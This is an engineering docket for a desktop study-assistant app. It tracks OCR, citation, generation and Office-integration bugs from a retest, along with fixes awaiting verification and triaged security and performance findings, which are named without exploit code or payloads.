# Active engineering docket

Updated 2026-10-04 during the bug-fix pass after the round-2 retest of `92be710`. This file contains
unresolved problems, observed quality gaps, required platform verification and
decisions with real tradeoffs. This is the only work queue, including remaining
review checks and feature decisions. Confirmed failures, partial fixes and
unverified claims retain their evidence status. Addressed bugs stay marked **Fixed in code — awaiting verification** until the user
confirms the retest; historical triage in `notes.md` is superseded where the retest
contradicts it. Implementation and focused regression checks now cover the reviewed citation,
practice, ingestion, provider, graph and UI failures. Remaining semantic and native
acceptance below is not superseded by passing mechanical tests.

Evidence: [RETEST-round2.md](C:/Users/moomi/Downloads/RETEST-round2.md), 2026-10-03,
Linux scratch checkout at `92be710`, five PDFs. Initial ingestion used LongCat;
artifact/answer replays and probes used MiMo. The Week5 re-run used a mismatched
shell credential and did not establish successful OCR. Findings below are reported
by that external retest, not a claim that the five-PDF corpus was independently rerun locally.
`R2-NEW-*` preserves the report's NEW-1 through NEW-7 identifiers.

The retest verified STK-001, STK-006, STK-007, STK-008, STK-010, STK-014 and
STK-040. These do not remain standalone tasks. STK-010's original word-joining
defect is fixed; new extraction defects are tracked separately below. STK-040's
ten-question count passed; incomplete-generation recovery is still open.
Code changes awaiting GUI verification remain listed under B-10. A report saying
"not fixed" without a new reproduction does not establish a regression; the
remaining review checks below still need assessment. All outstanding work is
tracked here rather than in a separate queue.

## Decisions with real tradeoffs

### B-04 — Local runner scheduling

One llama-server switches models under a lock while generation HTTP runs outside
that lock. Changing models can interrupt a request; status/stop may wait through
startup. A runner lease and queue fit the 8 GB floor but add waiting/reloads.
Concurrent runners improve overlap but require RAM limits and eviction.
Recommendation: one runner with foreground priority, optional concurrency later.
The user has been asked to choose. Related: X-07, X-11, X-12, X-15, X-16.
Reproduce competing foreground/background calls and stop-during-load before
selecting cancellation/shutdown behavior. This pass did not implement a scheduler.

### B-05 — Office pairing and integration authority

Native export selection is decided: the shell opens Save, confirms replacement
and writes the selected file. The backend rejects caller-supplied write paths and
provides rendered cited bytes; browser development exports use exclusively reserved
names in the configured export folder. AR-03/S-01 now need native acceptance under
B-10, rather than another destination-policy decision.

The remaining authority question is authenticated one-time Office pairing and
grants for opening selected Office documents. Custom local/LAN model URLs and
opening chosen Office files are intended capabilities. Optional Office
authentication still exists; a launch token does not promise isolation from every
program running as the same OS user. S-04/S-07/S-08/S-18 refer to this decision.
The user has not selected an Office pairing policy.

### B-14 — Backup fidelity

Full/partial/heavy currently choose retained categories; ZIP compression preserves
retained content exactly. The user already authorized willingness to lose detail
in reduced tiers. The remaining design decision is which source representations
may lose detail while exact passages/locators remain recoverable. Lossy downsampling
can discard visual evidence; compressing memory into summaries can discard history.
No lossy source rewriting was added. Installed backup activation remains B-10.

### C-63 — Cloud budget semantics

Current budget checks are a stop between requests, not reservations: concurrent
in-flight calls can overshoot the remaining allowance. Usage now includes empty,
truncated and reasoning-retry responses before their validation fails, and local
traffic is classified separately.
**Fixed in code — awaiting verification: missing-usage reporting.** Migration 022
preserves old token values and leaves their reporting status unverified; new
completion rows explicitly record whether both counts were supplied. Settings
shows incomplete/unverified cloud requests and labels its totals as reported
usage. Partial counts are retained; absent/malformed counts do not become estimates
or falsely verified zeros. `test_usage_reporting.py` covers migration, genuine
zero, partial/malformed reports, cutoff persistence, month/local filtering and
API propagation; full-backup tests preserve the flag after restore. Historical
rows cannot be retrospectively verified without independent provider evidence.
Reported usage in HTTP 200 failure envelopes is recorded before raising the
provider error; unreadable 200 replies retain an explicit unknown-usage entry.
A hard ceiling still needs token reservations and
rules for missing/late provider usage. Decide whether that extra cost/queuing is
required; do not describe the present soft stop as a strict spending cap.

## Actual output and history gaps

### Output completion and artifact structure — STK-004, STK-029, STK-038; R2-NEW-5, R2-NEW-7

**Partial / reproduced failures.** LongCat has a profile and failed calls are
accounted for. At retest MiMo had no shipped profile and defaulted to 2,048 output
tokens (R2-NEW-7); the tester's 16,384-token profile was untracked.
**Fixed in code — awaiting verification (R2-NEW-7):** that exact model now has
a shipped 16,384-token preferred allowance, based on the supplied report. This
is an empirical preference, not a claim about its advertised output/context ceiling.
Reasoning consumed 3,307 of 4,096 completion tokens in a three-page OCR probe.
Summary runaway was not re-measured (STK-029).

Real-path MiMo deck and study-guide requests both failed after two billed drafts
(28 s / 184 s). Deck drafts were malformed or title-only. The guide contained
substantive content flattened onto one heading-prefixed line; the heading-only
guard rejected it (R2-NEW-5). Direct strict-schema probes lost all newlines/slide
separators; a document hit its limit in a citation loop. The same deck prompt
without a schema produced eight separated slides in 22.1 s versus 188.9 s in
strict mode; `json_object` also yielded usable JSON in a probe. These observations
identify a compatibility gap, not an approved fallback architecture.

**Structure fix in code — awaiting verification (R2-NEW-5).** Document generation
now requests sections/paragraph arrays; deck generation requests slide/paragraph
arrays. The app assembles Markdown headings and boundaries before the existing
workspace citation gate. Title-only sections/slides, duplicate slides, invalid
citations and an incorrect explicitly requested slide count are withheld and get
one repair. Legacy Markdown responses remain readable. Chat → adoption → reopen
→ cited export tests cover both formats. Rerun the actual MiMo cases before closing
the compatibility finding; semantic quality and multi-unit completion remain open.

**Fixed in code — awaiting verification: shared recovery accounting (REV-M1).**
`common/generation.py` now bounds logical calls, HTTP parameter adaptations,
elapsed time and estimated input-plus-requested-output reservations across nested
schema/content repairs. Model choice is pinned within the operation. Whole-unit
cutoff/reasoning-only recovery widens only within configured allowances and
estimated available context; unknown ceilings are not invented. The tutor's
"much more briefly" retry and transport's hidden reasoning retry were removed.
Empty output gets at most one retry; background summaries do not retry. Provider
usage is recorded before output validation and cloud budget is rechecked between
HTTP requests. Missing counts are flagged in results/operation and the persisted
ledger/Settings (C-63), without estimating measured usage.
`test_generation.py` and `test_chat_flow.py` exercise shared
schema/repair exhaustion, cutoff billing, cancellation, deadlines, capacity limits,
and no partial chat/cache/artifact/practice writes after exhausted quiz recovery.

Multi-unit recovery, checkpoints, prose continuation and context reduction remain
planned. Input budgeting currently uses a byte-based estimate rather than a
compatible model tokenizer; visual token costs are unknown, so image calls cannot
automatically widen within a known context window. Acceptance still requires
substantive, correctly separated documents/decks,
bounded recovery after cutoff, truthful partial/failure reporting, pinned source
scope, and no duplicate artifacts or learning observations. Retain genuine
title-only rejection without rejecting a substantive flattened document. Valid
JSON and correct quiz count alone do not establish usable content.

### Conversation continuity — STK-028, STK-030, STK-031, STK-037

`tutor/chat.py` still combines a rolling summary with four recent messages and
600-character excerpts; failed/delayed summaries leave intervening history absent.
Workspace quiz history still omits questions beyond six and clips the key. This
can make a previous quiz unavailable or make conversational grading contradict
its own saved questions. Summarization now includes workspace notes and singleton
older messages, but that does not repair the context gap or full-artifact recall.

Complete the context portion of the output plan: retain unsummarized state within
the actual model budget, retrieve referenced saved turns/items, and route quiz
grading to the stored practice suite/key instead of re-deriving it from new course
retrieval. Conversation meta-questions need saved-chat evidence, while academic
claims still require eligible original material. Old citation numbers cannot be
reused against a new numbered source list. Acceptance: make a ten-question quiz,
discuss another topic, grade question ten correctly, then change source selection
without resurrecting excluded factual evidence.

### Request routing and scope — STK-033, STK-039

**Partial / reproduced.** "Create a one-page study sheet" now routes to DOCUMENT.
The reported "Write a 300-word essay … in your table" SHEET misroute is
**Fixed in code — awaiting verification**: an explicit document request takes
precedence over a later mention of a table/slides. A requested table of essay
arguments still routes to SHEET. "Add a column for the key law" still routes to
ANSWER rather than an edit (STK-033 remains partially addressed).

"Create a study guide for the first exam covering Weeks 1-5" retrieved course
outlines/grade allocation and produced exam logistics. A ten-question quiz
explicitly on Week 3 retrieved Weeks 2/5/6 and zero Week3 passages (STK-039).
Acceptance: correct output/edit intent, requested lesson coverage and visible
uncertainty when exam coverage is ambiguous. Filename tags alone cannot establish
the syllabus's exam coverage.

### Workspace export and narrow layout — STK-041, STK-043

Workspace document/sheet export now renders the current unsaved draft through the
same cited backend exporter as saved artifacts. It carries the original message
and item identity, compacts the original citation slots, includes the source legend,
and creates no artifact or learning record. The desktop Save dialog is the only
source of a destination; the UI displays the chosen path. Native confirmation,
locked-file failure, cancellation and saved file contents still need B-10 verification.

STK-043 reported narrow sheet cells using single-line inputs. **Fixed in code —
awaiting verification:** workspace/saved cells and quiz editor options now wrap
in automatically sized textareas, including read-only cells and draft reverts.
Displayed quiz prompts/options/explanations also wrap long unbroken text. Saved
sheet Enter navigates, Shift+Enter inserts a line break, Alt+Arrow navigates cells,
and plain arrows/IME input retain text editing behavior. Verify resizing the
companion, long cells, pasted multiline text, editing/revert/save/export and quiz
option readability under B-10; type checks do not close this GUI gap.

## Quality acceptance

### B-06 — Generated academic and pedagogical correctness

Independent semantic fixtures, expectation enforcement and a judge seam exist.
Run and inspect them against capable and local models. The broader recorded run
passed 7/10 and included an output-limit failure; narrow 2/2 probes did not close
that gap. Later better mechanical counts still accepted an invalid code transform.
Verify explanations, all quiz alternatives/keys, generated examples, hints that
help without leaking answers, research hypotheses, edits and mind-map membership.
Literal co-occurrence and citation numbers do not prove entailment. Preserve false
acceptance/refusal measurements and avoid executing generated code for validation.

STK-023 remains partial: Week5 cipher text is retrieved without a quality warning,
and Week3 digit corruption is undetected (STK-005 below). The retest found no
numeric-claim check. Acceptance must include uncertainty about illegible evidence
and numeric/date claims grounded in readable original material. The five MiMo
artifact/answer replays do not close the broader semantic gate.

### OCR/extraction corpus acceptance — STK-003, STK-005, STK-009; R2-NEW-1…4; C-16

Round 2 reproduced boundary failure, all-page text attributed to page 21,
HTTP 413 on 36 pages, and garbled pages displaced by blank pages at the cap.
It also found U+FFFE inside words, inconsistent CRLF, blank embedded passages
and corrupted digits that were not marked low quality.

The implementation now batches OCR (four pages plus encoded-image byte limits),
bounds rendered pixels, keeps explicit page identities, prioritizes garbled pages,
rejects ambiguous boundaries, and records unresolved pages/provider failures as
warnings. A malformed batch preserves usable mixed-PDF extraction and does not
trigger deterministic re-billing. Text normalization removes known extraction
artifacts before offsets are assigned; blank passages are not embedded or stored.
Pipeline version 6 / structured-v3 require reindexing to obtain the new extraction.

Remaining acceptance: rerun the five-PDF corpus, compare every recovered page and
numeric/date value against the original, verify FTS matches intact words, and show
unresolved coverage to students. Old wrong-page indexes do not repair themselves.
Tests of delimiters and limits establish behavior on fixtures, not OCR accuracy
or readable digits on the affected course files. Generated answers must not use
illegible evidence as if it were verified.

### Source classification and ingestion visibility — STK-017, STK-018

**Partial.** Pending rows and stage labels exist, but Week5 remained in "Reading
scans" for about six minutes per attempt with no per-page/percentage progress
(STK-017). All five reading/lecture PDFs were auto-typed as "notes" (STK-018),
including book chapters. Acceptance: accurate source-kind metadata or visible
uncertainty, and coverage/status that distinguishes unrepaired/skipped/failed
OCR from successful reading. Richer progress presentation remains a design option.

### B-07 — Real-course retrieval and extraction

Committed synthetic span/retrieval cases and precision/MRR/recall checks exist;
the round-2 five-PDF run supplies real-course evidence but does not close proofs,
tables, slides or large-course acceptance. "Reproduce Table 2.2" retrieved 21
passages from other weeks without the indexed target table; the model falsely
said it was absent and listed unrelated tables (STK-025, STK-044). Deck retrieval
repeated Week3 p53 windows three times (STK-026), supplying concrete evidence
for the diversity issue. These are active failures, separate from week/exam
scope above. Named-reading and follow-up misses (STK-011, STK-032) were not
re-measured and remain verification work tied to this gate. Evaluate relevance,
diversity and context preservation together.
Measure index memory, source update latency and O(n²) similarity rebuild cost.
No prerequisite/concept/TOC factual store should be resurrected.

C-16's observed request-size/page-alignment failures are owned by the OCR entry
above, not an additional duplicate task.

### B-10 — Native installed journeys and lifecycle fault checks

The external Linux retest reports successful `cargo build` and clippy, frontend
build/check/19 tests, 845 backend tests, lint/type checks and API regeneration.
The current bug-fix pass runs Python and frontend/add-in checks; it does not run
native compilation, packaging, installed applications or live model/corpus checks. The prior blanket "uncompiled" status
is superseded for that Linux development checkout; it does not establish installed
Windows/Mac/Linux behavior. Exercise companion
opening, TLS trust/untrust and port recovery, Word/Excel/PowerPoint reconnect,
download destinations, backup activation/restart/rollback, and sudden process exit.
The source fixes for X-01/X-04/X-05/R-04/R-05 now drain stdout during health polling,
clean up watcher-spawn failures, bound readiness waits and parse status codes.
The Linux build parsed/compiled them; native lifecycle fault behavior remains unverified.
X-06/AR-30/AR-64 now have source changes for explicit startup/restart failures,
a retry command, and short backend-state locking; shutdown/readiness waits run
outside that state mutex. Verify spawn failure, restart retry, racing backend-info
requests and simultaneous activation rejection in an installed app. X-09 needs confirmed job-object
assignment/termination coverage; do not claim hard-kill process-tree cleanup from
the normal stdin-EOF shutdown path alone.

Round-2 explicitly leaves these code changes awaiting GUI checks (not closed):

| IDs | Pending behavior check |
| --- | --- |
| STK-002 | Displayed citation page matches the actual passage window. |
| STK-012 | Factual questions get a full answer without an unsolicited "Your turn". |
| STK-013, STK-021 | Upload pending rows suppress the empty state; final coverage counts are displayed accurately. |
| STK-015, STK-016 | Bigger-model enabled/disabled behavior; empty library create form with no stray Cancel. |
| STK-019, STK-020 | Oldest-first sources; clear reindex menu and confirmation. |
| STK-022 | First chat question submits on Enter; original failure remains unconfirmed. |
| STK-034 | Collapsed sources, reply-start scrolling and wrapped passages. NBSP removal was measured. |
| STK-048 | Chat B's practice does not attach chat A's teaching event. |

STK-007's cited-subset behavior and STK-006's currency rendering passed mechanical/
answer replay checks; their GUI display is part of the combined citation check.
STK-024's clickable markers, STK-035's queue/cancel, STK-042's pane Office export,
STK-043's long cells, STK-045's paste label, STK-046's destination choice and
STK-047's slide navigation are covered by the entries below rather than
becoming duplicate GUI tasks.

### B-11 — Document changes during Office capture

Revision-bound Stacks snapshots reject stale replies, but an Office document may
change while multiple ranges/slides are read. A whole-document snapshot should
detect that change, retry within a bound or report uncertain coverage. Decide the
read-coherence guarantee before picking event counters/re-reads; verify each host.
PowerPoint notes now follow actual slide relationships when a deck is reordered;
unlinked notes are labelled uncertain. Live read coherence remains unresolved.

## Office lifecycle fault acceptance — S-16, S-29, S-30; AR-57

Connect/renewal/disconnect must coordinate the certificate cohort, manifest,
platform trust/registration, host and connected intent. A declined renewal or
failed registration/start must retain or restore the previous working connection;
rollback failures must retain cleanup identity and report the actual problem.
**Fixed in code — awaiting verification.** The service now stages renewal, coordinates
lifecycle state and compensates trust/registration/files/intent/host changes.
Fake-platform tests cover the failure paths; user-visible rollback reporting and
native behavior still require the acceptance below.

A host that misses its stop deadline deliberately keeps its live files and trust.
Removing those files while the host still runs is not a valid cleanup fix.
Startup cleanup preserves the original error. Windows trust/removal calls are
bounded. Installed Windows/macOS renewal, rollback and retry remain B-10 checks.

## Remaining review and feature work

These entries are part of the same docket. Investigate the reported behavior or
make the stated product decision; do not assume an unverified claim is a confirmed
bug. Existing evidence and intentional behavior stay explicit so future work does
not undo valid contracts. References to an existing task do not create another
independent task. Keep each addressed bug marked “Fixed in code — awaiting verification” until the user confirms its retest.

| ID | Work / reported issue | Evidence / next check |
| --- | --- | --- |
| B-08 | Learning evidence beyond the baseline (quality gap / future work) | Longitudinal learning acceptance beyond the implemented baseline; future study, not a diagnosed regression. |
| B-09 | Companion analysis and recovery (future work) | Multi-pass companion review and recovery expansion are new capabilities. |
| B-12 | Additional live hosts (deferred design) | Google live hosts and Mac window capture are additional integrations. |
| F-19 | Quiz picks reset when question count changes | Edits invalidate question identity; authoritative saved-suite loading replaces the initial preview and restores saved runs. Reopen only for lost picks with unchanged question/version identity or picks applied to different questions. **Fixed in code — awaiting verification.** |
| STK-011 | Question naming a reading retrieved nothing from that reading (Q12) | Observed named-reading miss belongs to B-07 real-corpus acceptance; reproduce before a separate ranking change. |
| STK-024 | Clickable inline citations | Round-2 confirms filename/page hover and preserved passage line breaks. Opening the cited source from a marker remains an interaction enhancement. |
| STK-032 | False "not in the material" refusals in follow-ups: a keyword hit doesn't steer the passage window; follow-up queries are diluted (T7 laws, T11 empresarios) | Follow-up refusal/window quality belongs to B-07; current-window tests exist but real-course acceptance is open. |
| STK-035 | Queue or cancel a pending reply | Unsent-draft feedback is implemented and awaits GUI verification. Queue/cancel remain optional capabilities. |
| STK-042 | Word/Excel/PowerPoint file export works on Linux but is only on the saved-artifact page; the pane offers .md/.csv and "Open in Office" | Office export already works after saving; exposing it directly in the workspace is a convenience feature. |
| STK-027 | Stream responses or show generation progress | No streaming exists; round-2 MiMo artifacts took 28–199 s behind the spinner. Better waiting feedback remains a capability choice; failed output is active STK-038, and stalled OCR visibility is STK-017. |
| STK-036 | Workspace tab origin "from Qn" is opaque (correct, but read as mislabeled) | The origin number was correct; clearer request/time labels are a UX improvement. |
| STK-045 | Companion: pasted documents are labelled "Partial or unverified capture"; Summarize pulls separator pages as course evidence | A paste cannot prove the original document was complete. Keep honest coverage; course retrieval quality is B-07. |
| STK-046 | Choose the course-export destination | Actual saved-path notice is implemented but awaits GUI verification. Home-directory fallback when Downloads is absent remains; a destination chooser is an enhancement. Workspace download failures are active STK-041. |
| STK-047 | Slides viewer/editor navigation gaps | Blank slides are intentionally preserved. Additional editor navigation is a feature, not grounds to delete content. |
| R2-NEW-6 | Diagnose shell / `.env` provider configuration mismatch | Round-2 switched `.env` to MiMo while the exported LongCat `LLM_API_KEY` retained precedence; requests got 401 and OCR fell back. This is an observed environment mismatch, not proof precedence is wrong. Clearer configuration diagnostics are optional; honest OCR failure status belongs to active STK-003 / R2-NEW-4. The report's switch-over commands were not executed here. |
| C-17 | Every PDF page is text-extracted twice (layout mode is expensive) | Alternate PDF extraction serves layout/quality checks; profile before removing it. |
| C-24 | `normalise_question` only trims `[\s?!.]+$` | Broader cache normalization improves hit rate but risks conflating distinct questions; no incorrect answer reproduced. |
| C-26 | Eval repeats label lookups per seam | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| C-30 | Retrieval trace records the embedding model, not the generation model | Legacy trace model means embedding identity; generation identity is recorded in answers/usage. Clarify portable trace metadata if needed. |
| C-31 | Retrieval trace omits policy version and reranker identity | Persisting complete retrieval policy/reranker identity improves reproducibility; not a reproduced wrong-answer cause. |
| C-38 | Five divergent citation dialects | Runtime, help, Office, quote and evaluation paths now share code-aware citation parsing. Semantic correctness remains under B-06. **Fixed in code — awaiting verification.** |
| C-48 | Import total-size cap trusts attacker-declared `ZipInfo.file_size` | Manifest reads are now actually bounded; ZipFile enforces member sizes. The claimed under-declaration bypass needs a working archive before more machinery. |
| C-52 | Notebook import creates dangling chunk references | Public imports already reject citations naming absent sources. Check a distinct missing-snapshot case before changing import semantics. |
| C-53 | Notebook export N+1 | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| C-54 | `json.dumps` without `ensure_ascii=False` in the notebook importer | JSON Unicode escapes round-trip identically; byte size/style is not data corruption. |
| C-55 | `_remap_payload` only remaps top-level ids | Workspace citation slots are integers, not chunk UUIDs; practice IDs are remapped. Provide a supported nested UUID shape before recursion. |
| C-58 | Orphan sweep reads every live course directory + all source ids each pass | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| C-59 | `assert row is not None` used as control flow across repos | Assertions after guaranteed RETURNING rows are programmer invariants; no reachable missing-row flow shown. |
| C-61 | `course_memory` reads lifecycle policy twice per refresh, dead vars | Unused budget variables were removed; repeated policy loading is a profiling/clarity candidate. |
| C-69 | Local-detection only recognizes `http://127.0.0.1` and `http://localhost` | Loopback URL parsing is fixed. LAN endpoints still carry remote disclosure; LAN alone does not establish local trust. |
| C-76 | Graded-work classifier edge cases | Remaining graded-work classifier false positives need independently reviewed intent fixtures (B-06). |
| C-77 | Two divergent graded-work classifiers | Office copied-assignment context differs from a chat completion request; matching regexes is not itself correct policy. |
| C-79 | Office `_context` computed twice; retrieval/embedding strings differ | Whitespace/context construction consistency is cleanup until a retrieval failure is demonstrated. |
| C-85 | `office_reader.merge` is O(units² · text-length) | Stale replacement keys and word-boundary matching are fixed; quadratic merge cost needs a representative profile. |
| C-91 | `data.py` reveals/counts with TOCTOU and silent OSError swallow | Storage estimates and reveal races need a concrete failed journey; do not cache arbitrary file changes without a freshness contract. |
| C-92 | `data.py` `explorer /select,<path>` misparses comma-containing paths | Comma-containing Explorer paths need a native reproduction before replacing the launcher. |
| C-93 | `conversations.list_messages` returns unbounded history | History pagination is a scale feature; adding it without integrating model context could worsen active history loss. |
| C-97 | Artifact `sources` lists are not deduped before persisting | Duplicate citation slots do not imply invalid evidence; naive deduplication changes marker meaning. |
| C-98 | `author:"model"` is client-assertable | Generated draft acceptance intentionally carries model metadata from the trusted app; authority questions belong to B-05. |
| C-100 | Malformed stored trace id → 500 | **Partially addressed — awaiting verification:** malformed stored citation UUIDs/markers return 422 (AR-42). A malformed message trace_id needs a separate supported corruption/import reproduction. |
| C-101 | Valid generated workspace item could hide an out-of-range citation in its introductory reply | **Fixed in code — awaiting verification:** composition now validates the introduction against the same original numbered evidence before publication. `test_valid_material_does_not_hide_invalid_citations_in_its_intro` covers a valid document paired with `[99]`. |
| C-102 | Unexpected completion/message shapes and optional provider metadata could raise unhandled AttributeError or invalid-token database errors | **Fixed in code — awaiting verification:** unreadable completion shapes produce an actionable provider failure; malformed optional usage is marked incomplete without discarding a valid answer, and malformed error metadata preserves the provider's error. `test_usage_reporting.py` exercises list/null messages, invalid/overflowing counts and list/string error metadata. |
| S-01 | **CRITICAL: arbitrary file write via artifact export path** | **Fixed in code — awaiting verification:** the API rejects write paths; native Save selection/replacement belongs to the shell. Test chosen destinations, cancellation, failed writes and replacement under B-10. |
| S-04 | Office bridge fails open by default | B-05 owns mandatory Office pairing/authentication; do not create a second security task. |
| S-07 | SSRF via connection test | Custom localhost/LAN provider URLs are intentional; B-05 owns allowed clients and URL authority. |
| S-08 | Arbitrary file launch via Office "open document" | Opening a user-selected Office file is intentional; B-05 owns selection grants and macro-file policy. |
| S-09 | Arbitrary local GGUF path hashed/registered with no cap | Multi-GB user-chosen GGUFs are supported; file hashing streams. Arbitrary small size/path caps would break this capability. |
| S-13 | ZIP extraction uses `extractall` without `filter` | The runtime ZIP is checksum-pinned; ZIP extractall has no tar-style filter argument. Reopen only with a concrete unsafe entry. |
| S-18 | API token passed via child environment, readable by same-user processes | Same-user process isolation is not promised by a loopback launch token; B-05 owns the threat model. |
| S-19 | Token kept in a cloned, non-zeroized `String` | Zeroizing token strings is additional hardening, not an established access boundary. |
| S-20 | Office bridge / pane static assets served with `no-store` | No-store intentionally prevents stale Office panes; optimize only after measuring it. |
| S-26 | `office_version` can fail to increase | Version 1 and 1.0 are semantically equal; artificial version growth for equivalent strings is not required. |
| S-27 | `manifest.render` replaces the first `<Version>` blindly | The known template's Version/origin are validated and publication is atomic; multiple-Version failure needs a real template. |
| S-31 | `office_reader`/`package` `_MAX_PART_BYTES` name implies whole-file | Naming-only cleanup; compressed input and expanded parts are now both bounded. |
| X-02 | Tauri `shutdown()` blocks the event-loop thread up to 20s | Shutdown deliberately waits for backend exit, including backup activation. Measure quit latency before changing its integrity guarantee. |
| X-03 | No `Drop`/kill-on-drop; no job object/process group on Unix | Stdin EOF is the lifecycle protocol. Hard-kill/process-group recovery belongs to B-10 native fault checks, not an assumed normal-exit leak. |
| X-08 | `cleanup_stale_server` on Windows kills by PID after a substring check | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| X-13 | `_KillOnCloseJob` handle never closed; log unbounded | Job-handle disposal/log rotation are lifecycle improvements pending a long-lived-process resource measurement. |
| X-14 | Hardcoded llama port duplicated in two configs | Config port coherence needs a nondefault-port fixture; default bundled paths agree. |
| X-17 | `user_models.add_from_file` whole-file sync hash, no cap | Hashing is chunked and registration is a synchronous worker route. Progress/cancellation are future UX work. |
| X-20 | `model_store._downloads` entries never pruned | Download state is one entry per model; deletion clears it. No unbounded per-attempt growth demonstrated. |
| X-22 | `sha256_of` whole-file sync reads block request threads | sha256_of already streams chunks; synchronous work runs in a request worker. Additional cancellation/progress is an enhancement. |
| X-28 | No `async def` handlers: long model calls occupy the AnyIO threadpool | Several long routes are async already. Model saturation needs a measured concurrency case; a blanket async refactor does not bound model calls. |
| X-29 | `wakeup()` TOCTOU / data race on `_LOOP` | Closed-loop wakeup is guarded; the startup ordering micro-race needs a reproducible missed wake before a synchronization redesign. |
| X-35 | Frontend systemic: API errors are thrown, so every `error` branch is dead and calls reject | The API intentionally throws typed errors. Changed call sites now handle them; audit individual remaining failures rather than replacing the client contract globally. |
| P-01 | `get_settings()` re-reads `.env` from disk on every call | **Fixed in code — awaiting verification:** .env is loaded once per process/path; settings still read current environment values. Quoted literals and invalid Office ports have regression coverage. |
| P-02 | TOML policies re-parsed per request/retrieval | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-03 | `db.connect` re-runs PRAGMAs and re-resolves the path every connection | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-04 | `embed_texts` re-validates every vector's dimension per call | Dimension checking validates the contract; do not remove safety checks solely because they take time. |
| P-05 | `encoders` downloads tokenizer files with no hash/size cap | Large encoder files are reverified and small metadata downloads capped/streamed. Tokenizer files remain revision-pinned; optional extra hash pinning is future hardening. |
| P-07 | Embedding seam materializes every vector for the course per query | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-15 | `settings.py` does N keyring reads per providers/model-options call | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-16 | `runtime._overview` N+1 settings reads + hardware detect per poll | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-17 | `office.list_courses` N+1 `list_sources` per course | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-18 | `data._tree_bytes` walks the whole storage/model trees per request | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-19 | `model_store._external_candidates` rglobs the entire HF hub/lmstudio each lookup | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-20 | `course_archive.export` and `downloads.sha256_of` whole-file memory/hash | Archive sources now stream; sha256_of already streamed. Only latency/progress measurements remain. |
| P-21 | `sources.py` re-decodes the PDF and re-renders the page per request | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-22 | Frontend `DocEditor` re-evaluates the whole toolbar every transaction | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-23 | Frontend `citationChips` rebuilds all decorations every change | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-25 | Frontend `ResizableSplit` updates per pointermove with no rAF, and persists per change | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| P-26 | `RichText` re-parses entire answers on unrelated re-renders | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| F-07 | `artifact.save` 409 branch is unreachable | The 409 catch already handles conflicts; deleting an unreachable redundant branch is readability cleanup. |
| F-08 | `chat.setModel`/`setSources` leave an empty conversation on failure | A model/source pick intentionally persists a draft chat. Atomic first-pick creation would improve failed-patch recovery, but the no-empty-chat premise was inaccurate. |
| F-22 | `render.ts` enables the SVG DOMPurify profile for model HTML | SVG sanitization supports generated charts; removing it blindly would remove supported rendering. Needs a concrete sanitizer bypass. |
| F-23 | `ArtifactContent` type-cast bypasses validation | API data is backend-validated; a TypeScript cast alone is not evidence of invalid persisted content. |
| F-24 | `toast` dismissal timers never cleared; unbounded list | Toast capacity/timer bookkeeping needs a real persistent-growth case. |
| F-25 | `format.timeAgo` NaN for invalid input; `labels.initials` astral hashing | Invalid time strings now show Unknown date; astral-character hashing is a cosmetic consistency candidate. |
| F-26 | `+error.svelte` full-reloads the SPA | Full reload can deliberately recover a broken SPA; router navigation is not automatically safer. |
| F-28 | `panel.setWidth` persists on every move if used | Measure an active pointer-persistence call path before adding another debounce layer. |
| R-02 | Release backend path depends on an out-of-band config override | The documented desktop builder supplies bundled resources; an unsupported plain build command is not the shipping path. |
| R-06 | `panic = "abort"`, `opt-level = "s"`, mobile crate types | Cargo size/panic/crate choices need a demonstrated build/startup failure. X-06 separately tracks the actual error-page path. |
| R-09 | CSP may block the inline theme bootstrap; `devCsp: null` | Theme/CSP failure needs a current packaged-platform reproduction. |
| R-13 | `BackendInfo.log_dir` exposed but never read by the frontend | Unused log_dir is a diagnostics opportunity, not broken behavior. |
| T-04 | `setuptools.find` with no `__init__.py` builds an empty distribution | Namespace packaging and package data are fixed. Standalone installed script entry points are future packaging work. |
| T-13 | Wall-clock / port / host-environment dependent tests | Unconfirmed optimization/testing candidate; establish a current user-visible failure or representative profile before changing the architecture. |
| T-16 | Per-case evaluation provider failures | Eval failures already produce a nonzero exit; per-case report continuation needs a failure fixture. |
| T-20 | `dump_openapi.py` doesn't assert a non-empty spec | Spec generation already returns the actual API schema; an additional empty-spec assertion is not a feature defect. |
| T-23 | CI actions pinned to mutable tags; no lockfile cache key | Constraint caching is fixed; pinning action SHAs is an optional repository supply-chain policy. |
| T-25 | `conftest` keyring stub depends on the module-attribute import style | The keyring seam is stubbed for current import usage; a hypothetical future import refactor is not a current leak. |
| T-26 | `test_retrieval` / `test_schemas` pin stub arithmetic rather than semantics | Deterministic arithmetic tests are mechanical fixtures, explicitly separate from B-06 semantic acceptance. |
| T-27 | `tests/factories.rename_course` bypasses the repo seam | Test fixture SQL does not establish a production repository failure. |
| T-28 | No tests for `sanitize_display_name` truncation, streaming ceiling, archive symlinks | Missing-test suggestions need an uncovered behavioral risk, not a blanket test-count target. |
| T-29 | No end-to-end test for `set_version.py` | Version-script end-to-end coverage is a test enhancement. |
| D-08 | `migrate` uses f-string SQL + `executescript` (implicit commit) | Migration owns a fresh connection and wraps each script in BEGIN/COMMIT, with rollback. Trusted versioned SQL interpolation is not a transaction or injection defect here. |
